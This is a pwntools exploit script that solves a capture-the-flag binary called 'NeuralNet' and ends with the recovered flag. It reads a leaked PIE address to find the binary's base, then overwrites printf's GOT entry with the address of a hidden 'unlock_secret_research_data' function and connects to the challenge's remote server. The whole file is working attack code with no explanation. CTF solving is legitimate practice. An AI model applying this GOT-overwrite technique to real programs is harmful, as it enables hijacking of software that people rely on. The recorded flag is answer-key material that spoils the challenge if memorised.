#!/usr/bin/env python3

from pwn import *

exe = ELF("./NeuralNet_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("ctf.mf.grsu.by", 9076)

    return r


def main():
    r = conn()
    output = r.recvuntil(b"> ")
    leaked_pie = int(output.split(b"(predict_outcome): ")[1].split(b"\n")[0], 16)
    pie_base = leaked_pie - exe.symbols["predict_outcome"]
    log.info(f"Leaked PIE base: {hex(pie_base)}")

    exe.address = pie_base
    
    r.sendline("3")
    r.recvuntil(b"> ")
    r.sendline(str(hex(exe.got["printf"])))
    r.recvuntil(b"> ")
    r.sendline(str(hex(exe.symbols["unlock_secret_research_data"])))
    # gdb.attach(r, )


    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()


# grodno{p3R3D08UchIL_n3ir053t_prY4M0_v_G0T}